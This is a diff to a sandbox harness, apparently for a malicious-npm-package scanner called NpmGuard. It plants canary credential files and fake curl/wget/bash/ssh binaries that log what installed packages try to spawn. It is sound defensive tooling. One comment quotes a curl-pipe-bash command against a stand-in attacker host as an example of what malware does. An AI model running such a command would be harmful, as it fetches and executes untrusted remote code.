@@ -39,11 +39,36 @@ export function canaryEnvFlags(): string[] {
 export interface PlantedFile {
   relativePath: string;
   content: string;
+  /** Set to true for executable files (chmod 0755 instead of 0644). */
+  executable?: boolean;
 }
 
-/** Files to plant under the workdir so HOME-rooted reads find canary content. */
+/** Fake binaries shadow real ones in PATH. Each logs its argv to
+ *  /workspace/spawn-log.txt so tests can assert on what the malware tried
+ *  to spawn (e.g. `curl https://attacker.com/payload | bash`, `npm install -g X`).
+ *  Without these, PROCESS_SPAWN findings end up TEST_UNCONFIRMED because
+ *  the real binaries either fail (no network) or aren't present in the slim image. */
+const FAKE_BIN_NAMES = ["npm", "npx", "yarn", "pnpm", "bun", "curl", "wget", "git", "ssh", "scp", "bash", "sh"];
+
+function fakeBinaryScript(name: string): string {
+  return `#!/bin/sh
+# NpmGuard fake binary — logs invocation and exits 0
+{
+  printf '%s' "${name}"
+  for a in "$@"; do printf ' %s' "$a"; done
+  printf '\\n'
+} >> /workspace/spawn-log.txt 2>/dev/null
+# Some malware checks for command output (e.g. \`gh auth token\`).
+# Return a canary string so the downstream code path proceeds far enough
+# to make additional observable calls.
+echo "NPMGUARD_CANARY_FAKE_BIN_${name.toUpperCase()}_OUTPUT"
+exit 0
+`;
+}
+
+/** Files to plant under the workdir: canary credential files + fake binaries. */
 export function canaryPlantedFiles(): PlantedFile[] {
-  return [
+  const files: PlantedFile[] = [
     {
       relativePath: "home/.npmrc",
       content: `//registry.npmjs.org/:_authToken=${CANARY.NPM_TOKEN}\n`,
@@ -66,5 +91,23 @@ export function canaryPlantedFiles(): PlantedFile[] {
       relativePath: "home/.aws/credentials",
       content: `[default]\naws_access_key_id=${CANARY.AWS_ACCESS_KEY_ID}\naws_secret_access_key=${CANARY.AWS_SECRET_ACCESS_KEY}\n`,
     },
+    // Empty spawn log file (tests read this; pre-create so an empty result is
+    // distinct from "log file missing").
+    { relativePath: "spawn-log.txt", content: "" },
   ];
+  for (const name of FAKE_BIN_NAMES) {
+    files.push({
+      relativePath: `fake-bin/${name}`,
+      content: fakeBinaryScript(name),
+      executable: true,
+    });
+  }
+  return files;
+}
+
+/** Docker `-e` flag that prepends /workspace/fake-bin to PATH so the fakes
+ *  shadow real binaries (when present). Append the original PATH so basic
+ *  utilities like `cat`/`ls` still resolve. */
+export function canaryPathEnvFlag(): string[] {
+  return ["-e", "PATH=/workspace/fake-bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"];
 }
